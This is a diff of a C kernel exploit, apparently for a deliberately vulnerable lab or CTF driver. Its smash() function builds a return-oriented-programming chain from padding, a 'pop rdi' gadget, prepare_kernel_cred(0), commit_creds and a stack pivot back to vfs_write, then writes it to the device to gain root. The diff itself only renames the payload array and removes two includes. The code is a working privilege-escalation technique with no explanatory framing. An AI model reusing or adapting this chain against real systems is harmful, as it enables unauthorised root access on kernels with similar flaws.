@@ -1,8 +1,6 @@
 #include <fcntl.h>
 #include <stdint.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <sys/types.h>
@@ -26,19 +24,19 @@ void open_device_state() {
 }
 
 void smash() {
-  uint64_t payload[10];
-  payload[0] = 0x4141414141414141ULL;
-  payload[1] = 0x4241414141414141ULL;
-  payload[2] = 0x4341414141414141ULL;
-  payload[3] = 0x4441414141414141ULL;
-  payload[4] = pop_rdi; // pop rdi; ret;
-  payload[5] = 0x0;
-  payload[6] = prepare_kernel_cred;
-  payload[7] = commit_creds;
-  payload[8] = pop_rsp;               // pop rsp; ret;
-  payload[9] = 0xffffc900001bff08ULL; // RSP -> vfs_write(), which is right
-                                      // after vulnerable vuln_write()
-  write(opend_, payload, sizeof(payload));
+  uint64_t fake_stack[10];
+  fake_stack[0] = 0x4141414141414141ULL;
+  fake_stack[1] = 0x4241414141414141ULL;
+  fake_stack[2] = 0x4341414141414141ULL;
+  fake_stack[3] = 0x4441414141414141ULL;
+  fake_stack[4] = pop_rdi; // pop rdi; ret;
+  fake_stack[5] = 0x0;
+  fake_stack[6] = prepare_kernel_cred;
+  fake_stack[7] = commit_creds;
+  fake_stack[8] = pop_rsp;               // pop rsp; ret;
+  fake_stack[9] = 0xffffc900001bff08ULL; // RSP -> vfs_write(), which is right
+                                         // after vulnerable vuln_write()
+  write(opend_, fake_stack, sizeof(fake_stack));
 }
 
 int main() {
